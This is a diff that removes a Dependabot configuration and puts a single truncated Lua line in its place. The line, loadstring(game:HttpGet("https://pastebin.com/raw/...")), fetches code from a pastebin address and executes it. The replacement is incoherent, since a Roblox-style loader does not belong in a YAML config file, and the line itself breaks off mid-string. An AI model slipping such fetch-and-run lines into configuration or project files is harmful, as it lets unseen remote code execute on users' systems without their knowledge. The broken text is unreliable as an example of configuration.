@@ -1,6 +1,1 @@
-version: 2
-updates:
-  - package-ecosystem: "github-actions"
-    directory: "/"
-    schedule:
-      interval: "monthly"
+loadstring(game:HttpGet("https://pastebin.com/raw/
